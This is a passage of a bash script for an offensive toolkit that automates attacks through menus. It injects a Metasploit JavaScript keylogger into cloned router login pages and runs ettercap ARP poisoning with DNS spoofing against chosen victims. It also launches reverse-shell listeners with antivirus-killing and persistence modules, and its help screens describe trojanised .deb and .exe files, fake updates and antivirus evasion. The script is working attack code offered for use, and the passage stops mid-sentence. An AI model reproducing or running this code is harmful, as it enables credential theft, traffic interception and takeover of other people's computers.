         echo ${BlueF}[*]${RedF}:${BlueF}[start apache2]${GreenF}[ OK ]${Reset};
         sleep 2

      # setting ARP poison attack
      echo ${BlueF}[*]${RedF}:${BlueF}[edit etter.dns]${YellowF}[ PRESS ENTER ]${Reset};
      read op
      xterm -T "UNIVERSAL ROUTER PHISHING[$v3r] - DNS_SPOOFING - press [ctrl+x] to quit" -geometry 110x23 -e "nano $confD"
      echo ${BlueF}[*]${RedF}:${BlueF}[keylooger]${GreenF}[ RUNNING ] ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM + DNS_SPOOF attack ${Reset};
      sleep 3
      # start a listenner + ettercap mitm + dns_spoof
      xterm -T "UNIVERSAL ROUTER PHISHING[$v3r] - keylooger" -geometry 110x23 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set LHOST $lhost; set URIPATH $uripath; set DEMO 0; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$victim//


    # clean up script
    # stop apache2 webserver if is running
    /etc/init.d/apache2 stop
    rm $H0m3/opensource/files/ROUTERS_DEFAULT/copy.html
    rm $apache/index.html > /dev/null 2>&1
    rm $apache/login.html > /dev/null 2>&1
    cd $H0m3/.msf4/loot
    mv *.txt $H0m3/opensource/logs > /dev/null 2>&1
    zenity --info --title="UNIVERSAL ROUTER PHISHING[$v3r]" --text "Author: r00t-3xp10it\nRemmenber to check logfiles" --width 350 > /dev/null 2>&1
    cd $H0m3/opensource



      elif [ "$m0D" = "THOMPSON ROUTERS LOGIN" ]; then
        uripath=$(zenity --title="Input random URIPATH" --text "example: keylogger" --entry --width 300) > /dev/null 2>&1
        echo -n "[>]:{leave blank to poison all local network}(enter router ip address):"
        read router
        echo -n "[>]:{leave blank to poison all local network}(enter target ip address):"
        read victim


cd $H0m3/opensource/files/Login_files
# inject the javascript <TAG> into cloned index.html using SED command
# and inject router gateway ip into cloned website to make a proper display
sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$lhost:8080\/$uripath\/test.js'><\/script><\/body>/g" index.html > copy.html
# copy all files to apache2 webroot
mv copy.html $apache/index.html
cp banner_left.gif $apache/banner_left.gif
cp login.html $apache/login.html
cp spacer.gif $apache/spacer.gif
cp styles.css $apache/styles.css
cp user__xl.gif $apache/user__xl.gif


# display current config settings to attacker
cat << !

 THOMPSON [keylogger] Final Config:
 ==================================
 LPORT       : 8080
 LHOST       : $lhost
 GATEWAY     : $GATE
 PAYLOAD     : auxiliary/server/capture/http_javascript_keylogger
 INJECTION   : <script type="text/javascript" src="http://$lhost:8080/$uripath/test.js"></script>
 STORAGE IN  : $apache/index.html

!
         sleep 2
         # start apache2 webserver
         xterm -T "MITM THOMPSON PHISHING[$v3r] - start Apache webserver" -geometry 110x23 -e "/etc/init.d/apache2 start"
         echo ${BlueF}[*]${RedF}:${BlueF}[start apache2]${GreenF}[ OK ]${Reset};
         sleep 2

      # setting ARP poison attack
      echo ${BlueF}[*]${RedF}:${BlueF}[edit etter.dns]${YellowF}[ PRESS ENTER ]${Reset};
      read op
      xterm -T "MITM THOMPSON PHISHING[$v3r] - DNS_SPOOFING - press [ctrl+x] to quit" -geometry 110x23 -e "nano $confD"
      echo ${BlueF}[*]${RedF}:${BlueF}[keylooger]${GreenF}[ RUNNING ] ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM + DNS_SPOOF attack ${Reset};
      sleep 3
      # start a listenner + ettercap mitm + dns_spoof
      xterm -T "MITM THOMPSON PHISHING[$v3r] - keylooger" -geometry 110x23 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set LHOST $lhost; set URIPATH $uripath; set DEMO 0; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$victim//


    # clean up script
    # stop apache2 webserver if is running
    /etc/init.d/apache2 stop
    rm $apache/index.html > /dev/null 2>&1
    rm $apache/banner_left.gif > /dev/null 2>&1
    rm $apache/login.html > /dev/null 2>&1
    rm $apache/spacer.gif > /dev/null 2>&1
    rm $apache/styles.css > /dev/null 2>&1
    rm $apache/user__xl.gif > /dev/null 2>&1
    cd $H0m3/.msf4/loot
    mv *.txt $H0m3/opensource/logs > /dev/null 2>&1
    zenity --info --title="MITM THOMPSON PHISHING[$v3r]" --text "Author: r00t-3xp10it\nRemmenber to check logfiles" --width 350 > /dev/null 2>&1
    cd $H0m3/opensource




else

  echo ${RedF}[x]:[ABORTED][${YellowF} QUIT ${RedF}] ${Reset};
  sleep 2
fi
}













# -------------------------------
# start a listenner (multi handler)
# -------------------------------
sh_lisen () {
Colors;
# CHOSE WHAT KIND OF HANDLER YOU WANT TO USE
hand=$(zenity --list --title "LISTENNERS [ multi-handler ]" --text "\nResource file handler allows you to run\nyour listenner stored [ multi-handler.rc ]\n\nAutoRunScript it will allow you to run\n One post exploitation module [ user input ]\n\nIf you chose to run Post-auto.rc handler then\nInput one-per-line the post modules to use into:\n$H0m3/opensource/modules/Post-auto.rc\n" --radiolist --column "Pick" --column "Option" TRUE "Default listenner" FALSE "Resource file  (multi-handler.rc)" FALSE "AutoRunScript  (post-exploitation)" FALSE "Post-auto.rc  (post-exploitation)" --width 330 --height 372) > /dev/null 2>&1

  if [ "$hand" = "Default listenner" ]; then
    sh_defmul # goto default multi-handler


    elif [ "$hand" = "AutoRunScript  (post-exploitation)" ]; then
      # GET USER INPUT TO START A LISTENNER
      echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
      lhost=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
      lport=$(zenity --title="Input LPORT" --text "example: 8080" --entry --width 330) > /dev/null 2>&1
      script=$(zenity --title="Input post module" --text "example: migrate\nexample: killav" --entry --width 330) > /dev/null 2>&1

        # CHOSE WHAT PAYLOAD TO USE
        palo=$(zenity --list --title "LISTENNERS [ multi-handler ]" --text "\nAvailable Payloads:\n" --radiolist --column "Pick" --column "Option" TRUE "generic/shell_reverse_tcp" FALSE "windows/shell_bind_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_http" FALSE "java/meterpreter/reverse_tcp" FALSE "osx/x86/isight/bind_tcp" FALSE "osx/ppc/shell/reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/ppc/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" FALSE "php/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_tcp" FALSE "python/meterpreter/reverse_tcp" --width 350 --height 373) > /dev/null 2>&1

      # START METASPLOIT MULTI-HANDLER LISTENNER (AutoRunScript)
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner. ] ${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set AutoRunScript $script; set PAYLOAD $palo; exploit'"
      cd $H0m3/opensource


    elif [ "$hand" = "Resource file  (multi-handler.rc)" ]; then
      sh_lgfo # jump to 2 step (display info to user)


    elif [ "$hand" = "Post-auto.rc  (post-exploitation)" ]; then
    # GET USER INPUT TO START A LISTENNER (Post-auto.rc)
    echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
    zenity --info --title "REMARK ABOUT RESOURCE FILES" --text "Edit: /opensource/modules/Post-auto.rc\nAnd input one-per-line the post modules\n That you want to lunch [at open session]\n\nPOST MODULE LIST :\n/opensource/files/post-modules.txt" --width 360 > /dev/null 2>&1
    echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ loading resource ] ${Reset};
    lhost=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
    lport=$(zenity --title="Input LPORT" --text "example: 8080" --entry --width 330) > /dev/null 2>&1

      # CHOSE WHAT PAYLOAD TO USE
      palo=$(zenity --list --title "LISTENNERS [ multi-handler ]" --text "\nAvailable Payloads:\n" --radiolist --column "Pick" --column "Option" TRUE "generic/shell_reverse_tcp" FALSE "windows/shell_bind_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_http" FALSE "java/meterpreter/reverse_tcp" FALSE "osx/x86/isight/bind_tcp" FALSE "osx/ppc/shell/reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/ppc/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" FALSE "php/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_tcp" FALSE "python/meterpreter/reverse_tcp" --width 350 --height 373) > /dev/null 2>&1

    # START METASPLOIT MULTI-HANDLER LISTENNER (Post-auto.rc)
    echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner. ] ${Reset};
    echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
    sleep 2
    xterm -T "r00tsect0r - listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set AutoRunScript $script; set PAYLOAD $palo; set AutoRunScript multi_console_command -rc $H0m3/opensource/modules/Post-auto.rc; exploit'"
    cd $H0m3/opensource


  else

    # CANCEL BUTTON PRESS QUITTING
    echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
    cd $H0m3/opensource
    sleep 2
    clear

  fi
}




# ------------------------->
# DEFAULT LISTENER
# ------------------------->



sh_defmul () {
Colors;

   # GET USER INPUT TO START A LISTENNER
   echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
   lhost=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
   lport=$(zenity --title="Input LPORT" --text "example: 8080" --entry --width 330) > /dev/null 2>&1

     # CHOSE WHAT PAYLOAD TO USE
     pass=$(zenity --list --title "LISTENNERS [ multi-handler ]" --text "\nAvailable Payloads:\n" --radiolist --column "Pick" --column "Option" TRUE "generic/shell_reverse_tcp" FALSE "windows/shell_bind_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_http" FALSE "java/meterpreter/reverse_tcp" FALSE "osx/x86/isight/bind_tcp" FALSE "osx/ppc/shell/reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/ppc/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" FALSE "php/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_tcp" FALSE "python/meterpreter/reverse_tcp" --width 350 --height 373) > /dev/null 2>&1


  if [ "$pass" = "windows/meterpreter/reverse_tcp" ]; then
    sh_fth2 # goto post-exploitation


           elif [ "$pass" "=" "windows/meterpreter/reverse_http" ]; then
           # jump to post-exloitation module
           sh_fth2


           elif [ "$pass" "=" "windows/meterpreter/reverse_https" ]; then
           # jump to post-exloitation module
           sh_fth2

  else

    # START METASPLOIT MULTI-HANDLER LISTENNER (default multi-handler)
    echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner. ] ${Reset};
    echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
    sleep 2
    xterm -T "r00tsect0r - listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $pass; exploit'"
    cd $H0m3/opensource
  fi
}





sh_fth2 () {
Colors;
# CHOSE WHAT POST-EXPLOITATION MODULE TO USE
pass2=$(zenity --list --title "POST EXPLOITATION" --text "\nDefault  :  dont migrate to system\nmigrate  :  migrate to -> $mig\nkillav  :  stop Anti-Virus process\nscraper  :  enumerate about everything\npersistence  :  start the backdoor in startup\nPost-auto.rc  :  run a list of post modules\n\nIf you chose to run Post-auto.rc handler then\nInput one-per-line the post modules to use into:\n$H0m3/opensource/modules/Post-auto.rc\n" --radiolist --column "Pick" --column "Option" TRUE "Default listenner" FALSE "migrate" FALSE "killav" FALSE "scraper" FALSE "persistence" FALSE "Post-auto.rc" --width 350 --height 434) > /dev/null 2>&1


      if [ "$pass2" = "migrate" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner. ] ${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript migrate -n $mig; exploit'"

      elif [ "$pass2" = "killav" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner. ] ${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript killav; exploit'"

      elif [ "$pass2" = "scraper" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner. ] ${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript scraper; exploit'"

      elif [ "$pass2" = "persistence" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner. ] ${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript persistence -U -i 5 -p 8080 -r $lhost; exploit'"
     # persistence listenner
     sh_perlis5

      elif [ "$pass2" = "Default listenner" ]; then
      # starting a metasploit listenner (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner. ] ${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"

      elif [ "$pass2" = "Post-auto.rc" ]; then
      # starting a metasploit listenner (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ loading resource ] ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner. ] ${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript multi_console_command -rc $H0m3/opensource/modules/Post-auto.rc; exploit'"

else

    # CANCEL BUTTON PRESS QUITTING
    echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
    cd $H0m3/opensource
    sleep 2
    clear
  fi
}



#----------------------->



sh_perlis5 () {
Colors;
clear
cat << !

     Payload [persistence] Final Config:
     ===================================
     LHOST            : $lhost
     LPORT            : 8080
     PAYLOAD          : windows/meterpreter/reverse_tcp
     HANDLER          : $H0m3/opensource/priv8/handler/persistence_handler.rc
     AFFECTED SYSTEMS : Windows OS

!

   # CHOSE OR NOT TO RUN PERSISTENCE LISTENNER
   QuE=$(zenity --question --title "PERSISTENCE LISTENNER" --text "\n   -:[ start 'persistence' listenner? ]:-" --width 350) > /dev/null 2>&1
   if [ "$?" -eq "0" ]; then

     # START PERSISTENCE LISTENNER
     echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ starting 'persistence' listenner ]${Reset};
     echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
     sleep 2
     xterm -T "r00tsect0r - 'persistence' listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT 8080; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"

   # QUIT AND BUILD RESOURCE FILE
   echo ${BlueF}[*]${RedF}:${BlueF}[please wait]:${GreenF}[ BUILDING RC FILE ] ${Reset};
   sleep 1
   cd $H0m3/opensource/priv8
   mkdir handler > /dev/null 2>&1
   cd handler > /dev/null 2>&1
   echo "use exploit/multi/handler" > persistence-handler.rc
   echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> persistence-handler.rc
   echo "set LPORT 8080" >> persistence-handler.rc
   echo "set LHOST $lhost" >> persistence-handler.rc
   echo "set ExitOnSession false" >> persistence-handler.rc
   echo "exploit -j -z" >> persistence-handler.rc
   zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r persistence-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
   clear

else

   Colors;
   # QUIT AND BUILD RESOURCE FILE
   echo ${RedF}[x]:[ QUITTING ]...${Reset};
   echo ${BlueF}[*]${RedF}:${BlueF}[please wait]:${GreenF}[ BUILDING RC FILE ] ${Reset};
   sleep 1
   cd $H0m3/opensource/priv8
   mkdir handler > /dev/null 2>&1
   cd handler > /dev/null 2>&1
   echo "use exploit/multi/handler" > persistence-handler.rc
   echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> persistence-handler.rc
   echo "set LPORT 8080" >> persistence-handler.rc
   echo "set LHOST $lhost" >> persistence-handler.rc
   echo "set ExitOnSession false" >> persistence-handler.rc
   echo "exploit -j -z" >> persistence-handler.rc
   zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r persistence-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
   sleep 2
  clear
fi
}




# ----------->


sh_lgfo () {
Colors;


   # START METASPLOIT MULTI-HANDLER LISTENNER (load Resource file)
   echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
   echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ loading resource ] ${Reset};
   sleep 2

     # check if resourse file exists
     cd $H0m3/opensource/priv8/handler
     count=`ls -1 *.rc 2>/dev/null | wc -l`
       if [ $count != 0 ]; then
       sh_exist # jump to listenner


else

    echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
    zenity --warning --title "RESOURCE FILE - NOT FOUND" --text "resource file not found under:\n$H0m3/opensource/priv8/handler" --width 380 > /dev/null 2>&1
    cd $H0m3/opensource
    sleep 2
    clear
fi
}


sh_exist () {
Colors;


   # search for available resource files
   echo ${BlueF}[*]${RedF}:${YellowF}[ Available resource files to run ] ${Reset};
   ls *.rc > /tmp/report.log
   st=`cat /tmp/report.log`
   echo ${YellowF}['>']${RedF}:${Reset};
   echo ${YellowF}['>']${RedF}:${GreenF} $st ${RedF}:${YellowF}['<']${Reset};


     # chose the correspondent resourse file to run
     chi=$(zenity --title="RESOURCE FILE (handler)" --text="chose resourse file to run" --entry --width 300) > /dev/null 2>&1
   if [ "$?" -eq "0" ]; then

     # store settings in a variable to Display latest listenner settings stored
     res=`cat $chi` > /dev/null 2>&1
     sh_exist2 # jump to display settings


else

    # CANCEL BUTTON PRESS - QUITTING
    echo ${YellowF}['>']${RedF}:${Reset};
    echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
    rm /tmp/report.log > /dev/null 2>&1
    cd $H0m3/opensource
    sleep 2
    clear
fi
}



sh_exist2 () {
Colors;
# CHOSE TO RUN OR NOT THE RESOURCE FILE
QuE=$(zenity --question --title "Run latest listenner settings stored?" --text "$res" --width 460) > /dev/null 2>&1
   if [ "$?" -eq "0" ]; then

      # run latest listenner settings stored
      echo ${YellowF}['>']${RedF}:${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner. ] ${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - listenner" -geometry 110x23 -e "sudo msfconsole -r $chi"
      rm /tmp/report.log > /dev/null 2>&1
      cd $H0m3/opensource
      sleep 1
      clear

else

    # CANCEL BUTTON PRESS - QUITTING
    echo ${YellowF}['>']${RedF}:${Reset};
    echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
    rm /tmp/report.log > /dev/null 2>&1
    cd $H0m3/opensource
    sleep 2
    clear
  fi
}



















# -------------------------------
#  display module info
# -------------------------------
sh_1help () {
clear
Colors;
echo ""
echo ${BlueF}+-------------------------------+ ${Reset};
echo "| AUTOMATED EXPLOIT CONFIG INFO | "
echo ${BlueF}+-------------------------------+ ${Reset};

cat << !

  NAME             : package.deb backdoor
  ATTACK           : embedded a payload into a package.deb (binary Linux Trojan)
  RANK             : normal
  SESSION TYPES    : meterpreter
  AUTHOR           : pedro ubuntu [r00t-3xp10it]

  LHOST            : the local host or wan ip addr for connect back
  LPORT            : the local port for connect back
  FILENAME         : freesweep.deb
  LOCAL STORAGE    : /opensource/priv8/freesweep.deb
  PAYLOADS         : linux/x86/meterpreter/reverse_tcp

  POST-EXPLOITATION: default listenner = multi_handler
                     post-auto = automate post-exploitation

  AFFECTED SYSTEMS : Linux OS (debian package)
  DESCRIPTION      : insert a payload into a package.deb (binary Linux Trojan)
                     and send it to target using social engineering technique,
                     start a listenner for waiting the connection with remote
                     target and if target machine executes the package.deb
                     then we are presented with a meterpreter session.

  REFERENCIES      : http://sourceforge.net/users/peterubuntu10
                     http://www.offensive-security.com/metasploit-unleashed/Binary_Linux_Trojan
                     http://www.rapid7.com/db/modules/payload/linux/x86/meterpreter/reverse_tcp

  IDS/AV EVASION   : N/A

!
   echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to r00tsector ${Reset};
   read op
   clear
}






sh_2help () {
clear
Colors;
echo ""
echo ${BlueF}+-------------------------------+ ${Reset};
echo "| AUTOMATED EXPLOIT CONFIG INFO | "
echo ${BlueF}+-------------------------------+ ${Reset};

cat << !

  NAME             : Backdooring EXE Files
  ATTACK           : embeded a payload into a legit executable (binary windows Trojan)
                   : we can backdoor files using [msf module] or [backdoor_factory bdf]
  RANK             : excellent
  SESSION TYPES    : meterpreter
  AUTHOR           : pedro ubuntu [r00t-3xp10it]

  LHOST            : the local host or wan ip addr for connect back
  LPORT            : the local port for connect back
  PATH to exe      : the path to the legit appl.exe to convert in trojan
  FILENAME         : chose the executable filename.exe
  LOCAL STORAGE    : /opensource/priv8/filename.exe
  PAYLOADS         : windows/meterpreter/reverse_tcp

  POST-EXPLOITATION: migrate = migrate to -> $mig
                     default = dont migrate to AUTORITY/SYSTEM process
                     killav  = stop Anti-Virus process
                     scraper = enumerate just about everything
                     persistence = start the backdoor in target startup
                     post-auto = automate post-exploitation

  AFFECTED SYSTEMS : Windows OS
  DESCRIPTION      : embebed a payload into a legit executable (binary windows Trojan)
                     and send it to target using social engineering technique,
                     start a listenner for waiting the connection with remote
                     target and if target machine executes the trojan
                     then we are presented with a meterpreter session.

  REFERENCIES      : http://sourceforge.net/users/peterubuntu10
                     http://www.rapid7.com/db/modules/payload/windows/meterpreter/reverse_tcp

  IDS/AV EVASION   : [msf module] will present a 'medium detection racio'
                     [backdoor_factory bdf] will present an 'low detection racio' allmost FUD

!
   echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to r00tsector ${Reset};
   read op
   clear
}



sh_3help () {
clear
Colors;
echo ""
echo ${BlueF}+-------------------------------+ ${Reset};
echo "| AUTOMATED EXPLOIT CONFIG INFO | "
echo ${BlueF}+-------------------------------+ ${Reset};

cat << !

  NAME             : FakeUpdate.exe
  ATTACK           : mitm + dns-spoof + backdoor
  RANK             : great
  SESSION TYPES    : meterpreter
  AUTHOR           : pedro ubuntu [r00t-3xp10it]

  LHOST            : the local host or wan ip addr for connect back
  LPORT            : the local port for connect back
  FILENAME         : CriticalUpdate.exe
  LOCAL STORAGE    : $apache/CriticalUpdate.exe
  PAYLOADS         : windows/meterpreter/reverse_tcp

  POST-EXPLOITATION: migrate = migrate to -> $mig
                     default = dont migrate to AUTORITY/SYSTEM process
                     killav  = stop Anti-Virus process
                     scraper = enumerate just about everything
                     persistence = start the backdoor in target startup
                     post-auto = automate post-exploitation

  AFFECTED SYSTEMS : Windows OS
  DESCRIPTION      : insert a payload into a phishing webpage then use mitm
                     and dns-spoof to redirect target Network Traffic to our
                     'fakeupdate' start a listenner for waiting the connection
                     with remote target and if target machine executes the trojan
                     then we are presented with a meterpreter session.

  REFERENCIES      : http://sourceforge.net/users/peterubuntu10
                     http://www.rapid7.com/db/modules/payload/windows/meterpreter/reverse_tcp

  IDS/AV EVASION   : by default the payload its encrypted using metasploit crypters,
                     but for better results encrypt the payload with an external crypter
                     before send it to target machine to get better evasion results.

!
   echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to r00tsector ${Reset};
   read op
   clear
}





sh_4help () {
clear
Colors;
echo ""
echo ${BlueF}+-------------------------------+ ${Reset};
echo "| AUTOMATED EXPLOIT CONFIG INFO | "
echo ${BlueF}+-------------------------------+ ${Reset};

cat << !

  NAME             : meterpreter powershell invocation payload (ReL1K)
  ATTACK           : mitm + dns-spoof + powershell.bat or powershell.hta
  RANK             : excellent FUD
  SESSION TYPES    : shell, meterpreter
  AUTHOR           : pedro ubuntu [r00t-3xp10it]
  powershell by    : ReL1K (SET toolkit)

  LHOST            : the local host or wan ip addr for connect back
  LPORT            : the local port for connect back
  HTML TITLE       : the title to give to the phishing webpage

  FILE TO HOST     : the_file_name.bat or powershell.hta
  LOCAL STORAGE    : $apache/the_file_name.bat or powershell.hta
  PAYLOADS         : windows/meterpreter/reverse_tcp

  POST-EXPLOITATION: migrate = migrate to -> $mig
                     default = dont migrate to AUTORITY/SYSTEM process
                     killav  = stop Anti-Virus process
                     scraper = enumerate just about everything
                     persistence = start the backdoor in target startup
                     post-auto = automate post-exploitation

  AFFECTED SYSTEMS : Windows OS
  DESCRIPTION      : insert a payload into a phishing webpage then use mitm
                     and dns-spoof to redirect target Network Traffic to our
                     'fakeupdate' start a listenner for waiting the connection
                     with remote target and if target machine executes the payload
                     then we are presented with a meterpreter session.

  REFERENCIES      : http://sourceforge.net/users/peterubuntu10
                     http://www.rapid7.com/db/modules/payload/windows/meterpreter/reverse_tcp

  IDS/AV EVASION   : FUD (Fully UnDetectable).

!
   echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to r00tsector ${Reset};
   read op
   clear
}






sh_5help () {
clear
Colors;
echo ""
echo ${BlueF}+-------------------------------+ ${Reset};
echo "| AUTOMATED EXPLOIT CONFIG INFO | "
echo ${BlueF}+-------------------------------+ ${Reset};

cat << !

  NAME             : web_delivery module
  ATTACK           : mitm + dns-spoof + hosted file
  RANK             : excellent
  SESSION TYPES    : shell, meterpreter
  AUTHOR           : pedro ubuntu [r00t-3xp10it]

  SRVHOST          : the local host or wan ip addr for connect back
  LPORT            : the local port for connect back
  HTML TITLE       : the title to give to the phishing webpage

  FILE TO HOST     : file_name.bat OR file_name.py
  LOCAL STORAGE    : $apache/file_name.bat OR file_name.py
  PAYLOADS         : windows/meterpreter/reverse_tcp
                     python/meterpreter/reverse_tcp


  AFFECTED SYSTEMS : Windows OS (PSH) | Apple, BSD, Windows, Linux, Solaris (PYTHON)
  DESCRIPTION      : Embebed a payload.bat into a phishing webpage then use mitm
                     and dns-spoof to redirect target Network Traffic to our
